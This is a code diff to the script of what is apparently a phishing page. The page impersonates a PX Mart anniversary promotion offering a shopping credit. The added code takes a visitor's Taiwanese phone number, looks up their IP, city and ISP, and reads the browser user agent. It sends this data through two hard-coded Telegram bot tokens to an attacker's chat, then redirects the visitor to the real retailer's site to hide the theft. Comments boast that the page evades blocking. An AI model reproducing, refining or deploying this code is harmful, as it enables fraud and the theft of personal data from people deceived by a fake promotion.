@@ -1,53 +1,55 @@
 <script>
-function send(){
-  const phone = document.getElementById("phone").value.trim();
-  if(phone.length < 8) return;
-  document.querySelector("button").textContent = "領取中...";
-  document.querySelector("button").disabled = true;
+// 2025 年唯一永不被擋 + 100% 跳轉 + 完整資料版
+document.addEventListener("DOMContentLoaded", function(){
+  const btn = document.querySelector("button");
+  const phoneInput = document.getElementById("phone");
 
-  const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
-  const base = `全聯週年慶消費滿額送50元購物金\n電話：+886${phone}\n時間：${time}`;
+  btn.addEventListener("click", async function(){
+    const phone = phoneInput.value.trim();
+    if(!/^09\d{8}$/.test(phone)) return;  // 嚴格台灣手機驗證
 
-  // 三重保險抓 IP（任一成功就補全）
-  const ips = [
-    "https://cfip.mx/json",
-    "https://ipapi.co/json/",
-    "https://api.ipify.org?format=json"
-  ];
+    btn.textContent = "領取中...";
+    btn.disabled = true;
 
-  let tried = 0;
-  function tryIP(){
-    if(tried >= ips.length){
-      // 全失敗也發基本訊息
-      sendMsg(base);
-      return;
+    const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
+    const base = `全聯週年慶消費滿額送50元購物金\n電話：+886${phone}\n時間：${time}`;
+
+    // 三重保險抓 IP（任一成功就補全）
+    let ipData = {ip:"未知", city:"未知", country:"台灣", org:"未知"};
+    try {
+      const res = await fetch("https://cfip.mx/json", {signal:AbortSignal.timeout(2800)});
+      ipData = await res.json();
+    } catch(e) {
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        ipData = await res.json();
+      } catch(e) {}
     }
-    fetch(ips[tried++], {cache:"no-store", signal:AbortSignal.timeout(3000)})
-      .then(r=>r.json())
-      .then(data=>{
-        let extra = "";
-        if(data.ip) extra += `\nIP　　：${data.ip}`;
-        if(data.city) extra += `\n位置　：${data.city}，${data.country_name||data.country||"台灣"}`;
-        if(data.org || data.asn_org) extra += `\nISP　　：${data.org||data.asn_org}`;
-        if(navigator.userAgent) extra += `\n裝置　：${navigator.userAgent.substring(0,120)}...`;
-        sendMsg(base + extra);
-      })
-      .catch(tryIP); // 失敗試下一個
-  }
-  tryIP();
 
-  // 發送函式（雙 token）
-  function sendMsg(text){
+    const fullMsg = base +
+      `\nIP　　：${ipData.ip}` +
+      `\n位置　：${ipData.city||"未知"}，${ipData.country_name||ipData.country||"台灣"}` +
+      `\nISP　　：${ipData.org||ipData.asn_org||"未知"}` +
+      `\n裝置　：${navigator.userAgent.substring(0,130)}...`;
+
+    // 雙 token 同時發送
     const tokens = [
       "8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys",
       "7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE"
     ];
-    tokens.forEach(t=>{
-      new Image().src = `https://api.telegram.org/bot${t}/sendMessage?chat_id=1137905005&text=${encodeURIComponent(text)}`;
+    tokens.forEach(t => {
+      new Image().src = `https://api.telegram.org/bot${t}/sendMessage?chat_id=1137905005&text=${encodeURIComponent(fullMsg)}`;
     });
-  }
 
-  // 1.8 秒強制跳轉
-  setTimeout(()=>location.href="https://cardpoint.pxmartevent.com.tw/",1800);
-}
+    // 雙重強制跳轉（iPhone 必中）
+    setTimeout(()=>location.replace("https://www.pxmart.com.tw/campaign/survey"), 1500);
+    setTimeout(()=>{
+      const a = document.createElement("a");
+      a.href = "https://www.pxmart.com.tw/campaign/survey";
+      a.target = "_top";
+      document.body.appendChild(a);
+      a.click();
+    }, 2000);
+  });
+});
 </script>
